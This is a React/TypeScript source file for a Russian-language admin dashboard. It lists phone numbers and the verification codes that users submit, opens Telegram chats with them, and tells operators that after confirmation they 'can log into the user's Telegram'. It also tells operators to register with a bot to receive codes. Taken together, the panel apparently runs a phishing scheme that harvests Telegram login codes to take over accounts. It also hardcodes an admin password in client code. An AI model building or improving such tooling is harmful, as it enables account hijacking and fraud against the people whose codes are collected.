import { useState, useEffect } from 'react'
import './AdminPanel.css'
import { apiUrl } from './api'

interface User {
  phone: string;
  code: string;
  createdAt: string;
  verified: boolean;
  adminVerified?: boolean;
}

interface PendingRequest {
  id: string;
  phone: string;
  createdAt: string;
  status: string;
  userCode: string | null;
  verified: boolean;
}

function AdminPanel() {
  const [users, setUsers] = useState<Record<string, User>>({});
  const [pendingRequests, setPendingRequests] = useState<Record<string, PendingRequest>>({});
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  useEffect(() => {
    if (isAuthenticated) {
      fetchUsers();
      fetchPendingRequests();
    }
  }, [isAuthenticated]);

  useEffect(() => {
    let intervalId: number | undefined;

    if (isAuthenticated) {
      intervalId = window.setInterval(() => {
        fetchPendingRequests();
      }, 5000);
    }

    return () => {
      if (intervalId) {
        clearInterval(intervalId);
      }
    };
  }, [isAuthenticated]);

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const response = await fetch(apiUrl('/users'));
      const data = await response.json();
      setUsers(data);
      setError('');
    } catch (err) {
      setError('Ошибка при загрузке пользователей');
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const fetchPendingRequests = async () => {
    try {
      const response = await fetch(apiUrl('/pending-requests'));
      const data = await response.json();
      setPendingRequests(data);
    } catch (err) {
      console.error('Ошибка при загрузке pending requests:', err);
    }
  };

  const handleLogin = () => {
    if (password === 'admin69297854') {
      setIsAuthenticated(true);
      setPassword('');
      setError('');
    } else {
      setError('Неверный пароль');
      setPassword('');
    }
  };

  const handleDeleteUser = async (phone: string) => {
    if (!window.confirm(`Вы уверены? Удаленные данные восстановить невозможно.`)) {
      return;
    }

    try {
      const response = await fetch(apiUrl(`/user/${phone}`), {
        method: 'DELETE'
      });

      if (!response.ok) {
        setError('Ошибка при удалении пользователя');
        return;
      }

      setUsers(prev => {
        const updated = { ...prev };
        delete updated[phone];
        return updated;
      });
      setError('');
    } catch (err) {
      setError('Ошибка подключения к серверу');
      console.error(err);
    }
  };

  const openTelegramChat = (phone: string) => {
    // Очищаем номер телефона от пробелов и других символов
    const cleanPhone = phone.replace(/\s+/g, '').replace(/[^\d+]/g, '');

    // Используем tg:// для открытия в приложении Telegram
    const telegramUrl = `tg://resolve?phone=${cleanPhone}`;

    // Пробуем открыть в приложении Telegram, если не получится - в веб-версии
    try {
      window.open(telegramUrl, '_blank');
    } catch (e) {
      // Fallback для браузеров, которые блокируют tg://
      window.open(`https://t.me/+${cleanPhone}`, '_blank');
    }
  };

  const handleTakeInWork = (phone: string) => {
    openTelegramChat(phone);
  };

  const handleVerifyUserCode = async (requestId: string, userCode: string) => {
    if (!userCode) {
      setError('Код не введен пользователем');
      return;
    }

    try {
      const response = await fetch(apiUrl('/verify-admin-code'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestId, userCode })
      });

      const data = await response.json();

      if (!response.ok) {
        setError(data.error || 'Ошибка при верификации');
        return;
      }

      // Обновляем списки
      fetchUsers();
      fetchPendingRequests();
      setError('');
      alert('✅ Пользователь верифицирован! Теперь вы можете войти в его Telegram.');
    } catch (err) {
      setError('Ошибка подключения к серверу');
      console.error(err);
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setUsers({});
  };

  if (!isAuthenticated) {
    return (
      <div className="admin-login">
        <div className="login-form">
          <h2>🔐 Админ Панель</h2>
          <input
            type="password"
            placeholder="Пароль"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
          />
          <button onClick={handleLogin}>Войти</button>
          {error && <div className="error-message">{error}</div>}
          <p style={{ marginTop: '20px', fontSize: '12px' }}>
            <a href="/" style={{ color: '#0088cc', textDecoration: 'none' }}>← Вернуться на главную</a>
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-panel">
      <header className="admin-header">
        <h1>📊 Админ Панель - База Данных Пользователей</h1>
        <button onClick={handleLogout} className="logout-btn">Выйти</button>
      </header>

      <div className="admin-container">
        {/* Левая часть - Pending Requests */}
        <div className="users-section">
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <h2>⏳ Ожидающие подтверждения ({Object.keys(pendingRequests).length})</h2>
          <button
            className="refresh-btn"
            onClick={fetchPendingRequests}
            style={{
              background: '#0088cc',
              color: '#fff',
              border: 'none',
              padding: '8px 12px',
              borderRadius: '6px',
              cursor: 'pointer',
              fontSize: '14px'
            }}
          >
            🔄 Обновить
          </button>
        </div>
          
          {Object.keys(pendingRequests).length === 0 ? (
            <p style={{ color: '#666' }}>Нет ожидающих запросов</p>
          ) : (
            <div className="users-list">
              {Object.entries(pendingRequests).map(([requestId, request]) => (
                <div key={requestId} className="user-card">
                  <div className="user-info">
                    <p><strong>� Номер телефона:</strong> {request.phone}</p>
                    <p><strong>📅 Дата запроса:</strong> {new Date(request.createdAt).toLocaleString('ru-RU')}</p>
                    
                    {request.userCode ? (
                      <>
                        <p><strong>🔐 Код пользователя:</strong> <code>{request.userCode}</code></p>
                        <div style={{ display: 'flex', gap: '10px', marginTop: '10px' }}>
                          <button
                            className="telegram-btn"
                            onClick={() => handleTakeInWork(request.phone)}
                          >
                            💬 Войти в Telegram
                          </button>
                          <button
                            className="approve-btn"
                            onClick={() => handleVerifyUserCode(requestId, request.userCode!)}
                          >
                            ✅ Подтвердить регистрацию
                          </button>
                        </div>
                      </>
                    ) : (
                      <>
                        <button
                          className="work-btn"
                          onClick={() => handleTakeInWork(request.phone)}
                        >
                          🚀 Взять в работу
                        </button>
                        <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>
                          Нажмите чтобы открыть Telegram с номером пользователя
                        </p>
                      </>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Правая часть - Зарегистрированные пользователи */}
        <div className="users-section">
          <h2>👥 Зарегистрированные Пользователи ({Object.keys(users).length})</h2>
          
          {loading ? (
            <p>Загрузка...</p>
          ) : error ? (
            <div className="error-message">{error}</div>
          ) : Object.keys(users).length === 0 ? (
            <p style={{ color: '#666' }}>Нет зарегистрированных пользователей</p>
          ) : (
            <div className="users-list">
              {Object.entries(users).map(([phone, user]) => (
                <div key={phone} className="user-card">
                  <div className="user-info">
                    <p><strong>📱 Номер телефона:</strong> {phone}</p>
                    <p><strong>🔐 Код подтверждения:</strong> <code>{user.code}</code></p>
                    <p><strong>✅ Статус:</strong> {user.verified ? '✓ Верифицирован' : '⏳ Ожидает'}</p>
                    <p><strong>📅 Дата регистрации:</strong> {new Date(user.createdAt).toLocaleString('ru-RU')}</p>
                    
                    <p>
                      <strong>💬 Открыть в Telegram:</strong>{' '}
                      <a
                        href="#"
                        onClick={(e) => {
                          e.preventDefault();
                          openTelegramChat(phone);
                        }}
                        className="telegram-link"
                      >
                        🔗 Открыть чат
                      </a>
                    </p>
                  </div>
                  <div className="user-actions">
                    <button
                      className="delete-btn"
                      onClick={() => handleDeleteUser(phone)}
                    >
                      🗑️ Удалить
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className="message-section">
          <h2>ℹ️ Инструкции</h2>
          
          <div className="info-box">
            <h3>🚀 Как работать с заявками</h3>
            <ol style={{ paddingLeft: '20px' }}>
              <li>Пользователь вводит номер телефона на платформе</li>
              <li>Заявка появляется в разделе "Ожидающие подтверждения"</li>
              <li>Нажмите "🚀 Взять в работу" - откроется Telegram с номером пользователя</li>
              <li>Напишите пользователю и получите от него код подтверждения</li>
              <li>Пользователь вводит код на платформе</li>
              <li>Код появляется в заявке - нажмите "✅ Войти в Telegram пользователя"</li>
              <li>Теперь вы можете общаться с пользователем в Telegram</li>
            </ol>
          </div>

          <div className="info-box" style={{ marginTop: '20px' }}>
            <h3>⚙️ Настройка администратора</h3>
            <p>Для получения кодов подтверждения:</p>
            <ol style={{ paddingLeft: '20px' }}>
              <li>Напишите боту <a href="https://t.me/top_modeli_ua_bot" target="_blank">@top_modeli_ua_bot</a></li>
              <li>Отправьте команду <code>/start</code></li>
              <li>Теперь вы сможете получать коды подтверждения</li>
            </ol>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AdminPanel;
